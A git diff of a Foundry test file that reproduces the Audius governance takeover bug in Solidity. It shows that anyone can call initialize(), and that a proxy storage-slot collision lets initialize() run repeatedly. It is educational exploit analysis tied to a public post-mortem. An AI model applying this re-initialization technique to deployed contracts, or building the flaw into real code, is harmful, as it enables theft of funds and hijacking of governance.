@@ -3,12 +3,14 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 
-import {AudiusAdminUpgradeabilityProxy} from "../src/AudiusHackFixed/Proxy/AudiusAdminUpgradeabilityProxy.sol";
-import {Proxy} from "../src/AudiusHackFixed/Proxy/Proxy.sol";
-import {DelegateManager} from "../src/AudiusHackFixed/Logic/DelegateManager.sol";
-import {Governance} from "../src/AudiusHackFixed/Governance.sol";
+import {AudiusAdminUpgradeabilityProxy} from "./Proxy/AudiusAdminUpgradeabilityProxy.sol";
+import {Proxy} from "./Proxy/Proxy.sol";
+import {DelegateManager} from "./Logic/DelegateManager.sol";
+import {Governance} from "./Governance.sol";
 
-contract AudiusHackFixed is Test {
+// writeup: https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
+
+contract AudiusHack is Test {
 
     AudiusAdminUpgradeabilityProxy public adminAddress;
     DelegateManager public delegateAddress;
@@ -27,15 +29,20 @@ contract AudiusHackFixed is Test {
         adminAddress = new AudiusAdminUpgradeabilityProxy(address(delegateAddress), address(targetAddr), "");
     }
 
-    // In the fixed version of the initializer modifier, only the admin can call initialize()
-    function testFailDirectInitialize() public {
+    // Demonstrate that any user can initialize the DelegateManager.sol contract behind the proxy directly,
+    // but that calling initialize directly works as expected.
+    // Anyone can call initialize() because there is no `require(msg.sender == proxyAdmin);` check
+    function testDirectInitialize() public {
         bytes32 beforeaction = vm.load(address(delegateAddress), bytes32(uint256(0)));
         emit log_uint(uint256(beforeaction)); // log the first storage slot value
         assertEq(uint256(beforeaction), 0);
 
-        // Cannot call initialize() without the proxy because the proxyAdmin variable is never set in DelegateManager.sol. The proxy must be used for proxyAdmin in DelegateManager.sol to have a value.
-        vm.prank(address(adminAddress.getAudiusProxyAdminAddress())); // @note switch to random address to show there are no special privileges needed to call initialize()
+        vm.prank(address(alice)); // @note switch to random address to show there are no special privileges needed to call initialize()
         delegateAddress.initialize();
+
+        bytes32 afteraction = vm.load(address(delegateAddress), bytes32(uint256(0)));
+        emit log_uint(uint256(afteraction)); // log the first storage slot value
+        assertEq(uint256(afteraction), 1);
     }
 
     // When initialize() is called directly, it can only be called once. Calling initialize() a second time causes an error
@@ -68,36 +75,42 @@ contract AudiusHackFixed is Test {
         assertEq((uint256(beforeaction) & 0x0100) >> 8, 1); // demonstrates that `bool initializing = true;` in initializer modifier
         // @note `require(initializing || isConstructor() || !initialized)` logic in Initialiable.sol initializer modifier accepts the above bool values
 
-        // Prank to send call as proxy admin
-        emit log_address(adminAddress.getAudiusProxyAdminAddress()); // log the first storage slot value
-        vm.prank(address(adminAddress.getAudiusProxyAdminAddress())); // @note switch to random address to show there are no special privileges needed to call initialize()
-
         // Call initialize for the first time using the proxy
         (bool init_bool, bytes memory init_data) = address(adminAddress).call(abi.encodeWithSignature("initialize()"));
+        assertTrue(init_bool);
+
+        // @note the initialize function can be called multiple times using delegatecall
+        // because the proxyAdmin variable in storage slot 0 of AudiusAdminUpgradeabilityProxy.sol
+        // effectively sets the values of `initialized` and `initializing` in DelegateManager.sol to false
+        (init_bool, init_data) = address(adminAddress).call(abi.encodeWithSignature("initialize()"));
+        assertTrue(init_bool);
+
+        (init_bool, init_data) = address(adminAddress).call(abi.encodeWithSignature("initialize()"));
         assertTrue(init_bool);
     }
 
     // When the governance address is changed 
-    function testDelegatecallTwice() public {
+    function testDifferentGovernanceAddress() public {
+        targetAddr = 0x4DEcA517D6817B6510798b7328F2314d30030001; // @note Not the production governance address, but used to show that the last bytes of the address control the boolean values in Initializable.sol
+
+        vm.etch(targetAddr, address(govAddress).code);
+
+        adminAddress = new AudiusAdminUpgradeabilityProxy(address(delegateAddress), address(targetAddr), "");
+
         bytes32 beforeaction = vm.load(address(adminAddress), bytes32(uint256(0)));
         emit log_uint(uint256(beforeaction)); // log the first storage slot value
-        
+
         // Check first bool value (no offset) 
-        assertEq(uint256(beforeaction) & 0x01, 0); // demonstrates that `bool initialized = false;` in initializer modifier
+        assertEq(uint256(beforeaction) & 0x01, 1); // demonstrates that `bool initialized = false;` in initializer modifier
         // Check second bool value (8 bit offset, use bitshift >> 8)
-        assertEq((uint256(beforeaction) & 0x0100) >> 8, 1); // demonstrates that `bool initializing = true;` in initializer modifier
-        // @note `require(initializing || isConstructor() || !initialized)` logic in Initialiable.sol initializer modifier accepts the above bool values
+        assertEq((uint256(beforeaction) & 0x0100) >> 8, 0); // demonstrates that `bool initializing = true;` in initializer modifier
 
-        // Prank to send call as proxy admin
-        emit log_address(adminAddress.getAudiusProxyAdminAddress()); // log the first storage slot value
-        vm.prank(address(adminAddress.getAudiusProxyAdminAddress())); // @note switch to random address to show there are no special privileges needed to call initialize()
-
-        // Call initialize for the first time using the proxy
+        // Because of the value of the boolean values above, initialize() can NEVER be called from the proxy, but it could be initialized by calling the contract directly
         (bool init_bool, bytes memory init_data) = address(adminAddress).call(abi.encodeWithSignature("initialize()"));
-        assertTrue(init_bool);
-
-        // Call initialize for the 2nd time fails because the storage slots are properly aligned now
-        (init_bool, init_data) = address(adminAddress).call(abi.encodeWithSignature("initialize()"));
         assertFalse(init_bool);
+
+        // Calling initialize() without using the proxy still succeeds
+        vm.prank(address(alice)); // @note switch to random address to show there are no special privileges needed to call initialize()
+        delegateAddress.initialize();
     }
 }
